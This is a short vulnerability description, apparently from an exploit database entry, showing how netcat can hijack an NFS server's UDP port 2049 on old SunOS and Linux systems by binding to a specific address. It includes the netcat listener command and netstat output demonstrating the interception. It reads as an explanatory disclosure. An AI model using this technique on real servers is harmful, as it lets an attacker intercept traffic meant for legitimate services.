  "Description": "One of the numerous interesting things you can do with netcat\n(ftp://ftp.avian.org/src/hacks.nc100.tgz) is take over\nnonpriviliged UDP ports from legitimate servers, such as NFS\nservers.  The basic problem is that (At least under SunOS 4.13u1\nand Linux 1.2.13) a process which binds to a udp port without\nspecifying which IP address it binds to it on, does not have\nexclusive control of that udp port.  ex:\n\ngary7% netstat -a | more\nActive Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address      Foreign Address   (state)\nudp        0      0  *.2049             *.*\n\nWhat this means is that the NFS server on udp port 2049 has chosen\nto listen to anything sent to port 2049, regardless of destination\naddress.  The problem with the current setup is that if you bind to\nudp port 2049 on a SPECIFIC address, your port request will\nsupersede that of the NFS server, and udp packets destined for port\n2049 on that particular IP address will be sent to you\ninstead. Let's use netcat to perform this:\n\ngary7% nc -u -s 198.77.179.33 -p 2049 -l -v -v\nlistening on [198.77.179.33] 2049 ...\n\n(and on a different tty)\ngary7% netstat -a | more\nActive Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address     Foreign Address   (state)\nudp        0      0  www.nsa.gov.2049  *.*\nudp        0      0  *.2049            *.*\n\nNow, you have TWO servers listening on the same port.  The first\none is netcat, which has bound to the IP address of www.nsa.gov.\nThe second is the legitimate NFS server.  However, incoming packets\ndestined for www.nsa.gov, instead of 127.0.0.1 will be sent to\nnetcat instead of the NFS server.",
